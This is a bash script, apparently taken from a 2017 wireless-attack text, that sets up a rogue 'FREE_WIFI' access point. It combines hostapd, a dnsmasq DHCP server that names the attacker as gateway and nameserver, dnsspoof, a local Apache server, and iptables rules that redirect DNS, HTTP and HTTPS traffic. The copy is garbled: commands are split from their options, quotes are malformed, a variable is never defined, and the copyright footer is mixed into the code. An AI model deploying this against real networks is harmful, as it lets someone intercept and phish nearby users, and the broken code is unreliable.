#!/bin/bash
phy=wlan0
channel=1
bssid=00:11:22:33:44:00
essid=FREE_WIFI
# kill interfering processes
service network-manager stop
nmcli radio wifi off
rfkill unblock wlan
ifconfig wlan0 up
echo “interface=$phy” > hostapd.conf
“driver=nl80211” >> hostapd.conf
“ssid=$essid” >> hostapd.conf
bssid=$bssid” >> hostapd.conf
“channel=$channel” >> hostapd.conf
“hw_mode=g” >> hostapd.conf
hostapd ./hostapd
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

echo "# define DHCP pool" > dnsmasq.conf
echo "dhcp-range=10.0.0.80,10.0.0.254,6h" >> dnsmasq.conf
echo "" >> dnsmasq.conf
echo "# set phy as nameserver" >> dnsmasq.conf
echo "dhcp-option=6,10.0.0.1" >> dnsmasq.conf
echo "" >> dnsmasq.conf
echo "# set rogue AP as Gateway" >> dnsmasq.conf
echo "dhcp-option=3,10.0.0.1 #Gateway" >> dnsmasq.conf
echo "" >> dnsmasq.conf
echo "dhcp-authoritative" >> dnsmasq.conf
echo "log-queries" >> dnsmasq.conf
dnsmasq -C ./dnsmasq.conf
&
echo ’10.0.0.1’ > dnsspoof.conf
dnsspoof –i $phy -f ./dnsspoof.conf
systemctl start apache2
echo ‘1’ > /proc/sys/net/ipv4/ip_forward
iptables
iptables
iptables
iptables
iptables
--policy INPUT ACCEPT
--policy FORWARD ACCEPT
--policy OUTPUT ACCEPT
--flush
--table nat --flush
iptables --table nat --append POSTROUTING -o $upstream --jump MASQUERADE
iptables --append FORWARD -i $phy -o $upstream --jump ACCEPT
iptables --table nat --append PREROUTING --protocol udp --destination-port
53 --jump REDIRECT --to-port 53
iptables --table nat --append PREROUTING --protocol tcp --destination-port
80 --jump REDIRECT --to-port 80
iptables --table nat --append PREROUTING --protocol tcp --destination-port
443 --jump REDIRECT --to-port 443
read -p ‘Press enter to quit...’
# kill daemon processes
for i in `pgrep dnsmasq`; do kill $i; done
for i in `pgrep hostapd`; do kill $i; done
for i in `pgrep dnsspoof`; do kill $i; done
for i in `pgrep apache2`; do kill $i; done
restore
© #
2017
Gabriel Ryan iptables
All Rights Reserved
iptables --flush
iptables --table nat –flush
